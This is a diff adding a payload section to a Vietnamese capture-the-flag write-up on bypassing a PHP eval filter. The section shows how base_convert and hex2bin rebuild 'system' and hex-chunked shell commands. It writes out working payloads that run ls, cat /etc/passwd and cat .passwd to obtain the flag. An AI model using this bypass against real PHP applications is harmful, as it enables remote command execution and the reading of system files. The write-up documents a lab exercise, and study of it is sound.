@@ -3,6 +3,7 @@
 - [PHP-Eval-Advanced filter bypass](#php-eval-advanced-filter-bypass)
   - [Source code](#source-code)
   - [Phân tích](#phân-tích)
+  - [Payload](#payload)
 
 ## Source code 
 
@@ -147,3 +148,35 @@ function safe_eval($calculus)
   return $ans;
   ```
   - Đoạn code này sẽ dùng để kiểm tra các điều kiện và thực thi chuỗi người dùng nhập vào.
+
+  ```php
+  var_dump($calculus);
+  ```
+  - Ham này sẽ dùng để in ra thông tin về mảng, chuỗi của $calculus
+  - Hàm base_convert(): 
+  - Hàm `base_convert(1751504350, 10, 36)` sẽ chuyển đổi một số từ hệ cơ số 10 sang hệ cơ số 36, với kết quả bao gồm cả các chữ cái và chữ số trong hệ cơ số 36. Kết quả của phép chuyển đổi này chính là chuỗi đại diện của số đó trong hệ cơ số 36.
+  - Để tái tạo hàm system từ hệ cơ số 36 về hệ cơ số 10, chúng ta sử dụng:
+    `base_convert("system", 36, 10)`
+  - Tương tự, command `ls` cũng được tạo như sau: `base_convert(784,10,36)`
+  - Kết hợp 2 hàm => `system(ls) = base_convert(1751504350,10,36)(base_convert(784,10,36))`
+  - Tại sao lại có `)` ở cuối ? PHP cho rằng kết quả của base_convert(1751504350,10,36) là một tên hàm. Sau đó, nó tìm cách gọi tên hàm này (ở đây là "system") với tham số từ base_convert(784,10,36). PHP sẽ hiểu rằng đang gọi hàm `system`
+  - Nhưng hiện tại mới chỉ thực thi được command khong có space và 1 số kí tự khác.
+  => sau khi tìm hiểu thì trong php có 2 hàm `hex2bin` cũng như `bin2hex` để chuyển các dữ liệu từ bin sang hex cũng như hex sang bin.
+  - Theo tìm hiểu thì trong hầu hết các trường hợp, kích thước tối đa của 1 số nguyên trong PHP là 2^32 bit => cần giới hạn đầu vào của base_convert thành các chuỗi biểu diễn các số có độ dài tối đa là 4 byte. Nếu cần có thể chia chuỗi đó thành nhiều phần khác nhau và nối chúng bằng dấu `.` => có thể thực hiện bất kì lệnh linux nào = cách chia nó thành các thành phần có độ dài 4 byte trở xuống. Chúng ta sẽ chuyển đổi các chuỗi thành chuỗi hex, chuyển đổi chuỗi hex này thành số nguyên bằng base_convert(HEX_CHUNK,10,36) và sau đố cuối cùng nối chúng bên trong 1 lệnh gọi được tạo bằng hex2bin và đặt bên trong 1 lệnh gọi đến system và nó sẽ được thực thi.  
+
+## Payload 
+
+- Payload sẽ giống thế này: `base_convert(1751504350,10,36)(base_convert(37907361743,10,36)(base_convert(chunk1,10,36).base_convert(chunk2,10,36).base_convert(chunk3,10,36)...))`
+- Tạo payload với hàm `cat /etc/passwd`: `base_convert(1751504350,10,36)(base_convert(37907361743,10,36)(base_convert(477080140104,10,36).base_convert(189751590363,10,36).base_convert(189803607951,10,36).base_convert(428637964,10,36)))` => `system(hex2bin('636174202f6574632f706173737764'))` => `system(cat /etc/passwd)`
+
+![alt text](image.png)
+
+- Và đây là kết quả sau khi payload chuỗi kia vào đoạn code
+- chúng ta sẽ payload tạo payload system('ls') để xem bên trong nó có gì: `base_convert(1751504350,10,36)(base_convert(784,10,36))`
+
+![alt text](image-1.png)
+
+=> có file `ch70.s` có thể thực thi. `base_convert(1751504350,10,36)(base_convert(37907361743,10,36)(base_convert(187349691536,10,36).base_convert(149148,10,36).base_convert(111711,10,36)))`
+
+- Không thể thực thi. Đoán rằng có thể flag nằm trong file ẩn .passwd => tạo payload `cat .passwd`: `base_convert(1751504350,10,36)(base_convert(37907361743,10,36)(base_convert(477080140104,10,36).base_convert(86,10,36).base_convert(423544719,10,36).base_convert(428637964,10,36)))` => có được flag 
+![alt text](image-2.png)
